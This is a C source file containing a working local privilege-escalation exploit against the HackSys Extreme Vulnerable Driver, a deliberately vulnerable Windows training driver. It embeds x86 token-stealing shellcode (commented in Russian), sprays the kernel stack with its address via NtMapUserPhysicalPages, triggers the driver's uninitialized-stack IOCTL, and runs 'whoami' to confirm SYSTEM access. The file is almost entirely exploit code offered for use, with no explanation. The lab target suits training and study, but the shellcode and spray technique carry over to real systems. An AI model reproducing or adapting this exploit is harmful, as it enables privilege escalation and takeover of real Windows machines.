#include <Windows.h>
#include <stdio.h>
#define HACKSYS_EVD_UNINITIALIZED_MEMORY_STACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI* PNtMapUserPhysicalPages)(
    IN PVOID          VirtualAddress,
    IN ULONG_PTR      NumberOfPages,
    IN OUT PULONG_PTR UserPfnArray);




int UninitializedMemoryStack()
{
    unsigned char shellcode[] = {
        0x60,
        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
        0x8B, 0x40, 0x50,
        0x89, 0xC1,
        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0x31, 0xC0,
        0xC3                                //ret
    };

    PNtMapUserPhysicalPages NtMapUserPhysicalPages = (PNtMapUserPhysicalPages)GetProcAddress(
        GetModuleHandle(L"ntdll"),
        "NtMapUserPhysicalPages");

    HANDLE device = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    LPVOID exploit = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exploit, shellcode, sizeof(shellcode));

    printf("addr of shellcode 0x%x\n", exploit);

    if (NtMapUserPhysicalPages == NULL)
    {
        printf("[+]Failed to get MapUserPhysicalPages!!!\n");
    }

    char arr[1024 * 4] = { 0 };
    PDWORD StackSpray = (PDWORD)arr;
    printf("[+]Spray address is 0x%p\n", StackSpray);

    for (int i = 0; i < 1024; i++)
    {
        *(StackSpray + i) = (DWORD)exploit;
    }

    NtMapUserPhysicalPages(NULL, 1024, StackSpray);

    char driverBuffer[] = "\xE4\xE2\xE4\xE2";

    DWORD retn;
    DeviceIoControl(device, HACKSYS_EVD_UNINITIALIZED_MEMORY_STACK, driverBuffer, 4, NULL, NULL, &retn, NULL);
    system("whoami");
}
